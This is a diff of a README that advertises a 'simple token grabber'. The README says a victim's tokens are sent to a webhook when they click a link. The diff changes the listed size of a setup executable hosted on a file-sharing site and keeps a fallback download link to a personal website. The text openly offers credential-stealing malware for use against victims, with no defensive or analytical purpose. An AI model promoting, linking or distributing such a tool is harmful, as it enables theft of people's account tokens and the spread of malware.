@@ -2,7 +2,7 @@
 This is a simple token grabber. When your victim clicks on a link their tokens are sent to a webhook. 
 # Download
 
-Download(27MB): https://anonfiles.com/PfV4sbnfyc/grabber-setup_exe
+Download(26MB): https://anonfiles.com/PfV4sbnfyc/grabber-setup_exe
 
 You can also download from my website if it doesnt work: https://bobsonhaxs.000webhostapp.com
 
